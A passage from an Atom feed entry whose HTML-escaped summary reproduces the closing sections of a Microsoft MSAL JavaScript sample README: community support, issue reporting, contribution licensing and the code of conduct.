href=&#34;https://docs.microsoft.com/azure/active-directory-b2c/code-samples&#34;&gt;MSAL B2C code samples&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Community Help and Support&lt;/h2&gt; &#xA;&lt;p&gt;Use &lt;a href=&#34;http://stackoverflow.com/questions/tagged/msal&#34;&gt;Stack Overflow&lt;/a&gt; to get support from the community. Ask your questions on Stack Overflow first and browse existing issues to see if someone has asked your question before. Make sure that your questions or comments are tagged with [&lt;code&gt;ms-identity&lt;/code&gt; &lt;code&gt;azure-ad&lt;/code&gt; &lt;code&gt;azure-ad-b2c&lt;/code&gt; &lt;code&gt;msal&lt;/code&gt; &lt;code&gt;javascript&lt;/code&gt;].&lt;/p&gt; &#xA;&lt;p&gt;If you find a bug in the sample, please raise the issue on &lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/issues&#34;&gt;GitHub Issues&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To provide a recommendation, visit the following &lt;a href=&#34;https://feedback.azure.com/forums/169401-azure-active-directory&#34;&gt;User Voice page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.opensource.microsoft.com&#34;&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
</feed>